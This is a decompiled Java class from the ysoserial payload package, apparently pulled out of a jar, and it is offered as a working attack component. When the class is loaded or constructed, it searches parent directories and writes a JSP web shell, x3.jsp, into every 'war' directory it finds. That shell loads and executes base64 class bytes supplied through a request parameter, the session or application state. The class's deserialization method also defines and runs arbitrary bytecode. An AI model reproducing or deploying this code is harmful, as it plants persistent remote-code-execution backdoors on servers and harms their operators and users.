package ysoserial.payloads.util;

import java.io.Externalizable;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectOutput;
import java.io.Serializable;

/* loaded from: jar1.jar:myjar/LongGo.class */
public class LongGo extends ClassLoader implements Serializable, Externalizable {
    byte[] a;

    static {
        doGetWar("..");
    }

    private static void doX3(String str) {
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(new File(String.valueOf(str) + File.separator + "x3.jsp"));
            fileOutputStream.write("<%@page import=\"javax.xml.bind.*,java.lang.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}%><% String c=(String)request.getParameter(\"c\");if (null == c && null != session)c=(String)session.getAttribute(\"c\");if (null==c&&null!=application.getAttribute(\"_c_\"))c=(String)application.getAttribute(\"_c_\");if(null!= c)try{application.setAttribute(\"_c_\",c);new U(this.getClass().getClassLoader()).g(DatatypeConverter.parseBase64Binary(c)).newInstance().equals(pageContext);} catch(Exception e){}%>".getBytes());
            fileOutputStream.close();
        } catch (Exception e) {
        }
    }

    private static void doGetWar(String str) {
        File[] listFiles = new File(str).listFiles();
        for (int i = 0; i < listFiles.length; i++) {
            if (listFiles[i].isDirectory()) {
                String absolutePath = listFiles[i].getAbsolutePath();
                if (absolutePath.endsWith("war") || absolutePath.endsWith("War")) {
                    doX3(absolutePath);
                } else {
                    doGetWar(absolutePath);
                }
            }
        }
    }

    public LongGo(byte[] bArr) {
        this();
        this.a = bArr;
    }

    public boolean c() throws Exception {
        return false;
    }

    public LongGo() {
        this.a = null;
        doGetWar(String.valueOf(System.getProperty("user.dir")) + "/..");
    }

    public boolean equals(Object obj) {
        return false;
    }

    @Override // java.io.Externalizable
    public void readExternal(ObjectInput objectInput) throws IOException, ClassNotFoundException {
        try {
            int readInt = objectInput.readInt();
            this.a = new byte[readInt];
            objectInput.read(this.a, 0, readInt);
            super.defineClass(this.a, 0, this.a.length).newInstance().equals(this);
        } catch (Exception e) {
        }
    }

    @Override // java.io.Externalizable
    public void writeExternal(ObjectOutput objectOutput) throws IOException {
        if (this.a == null || this.a.length <= 0) {
            return;
        }
        objectOutput.writeInt(this.a.length);
        objectOutput.write(this.a, 0, this.a.length);
    }
}
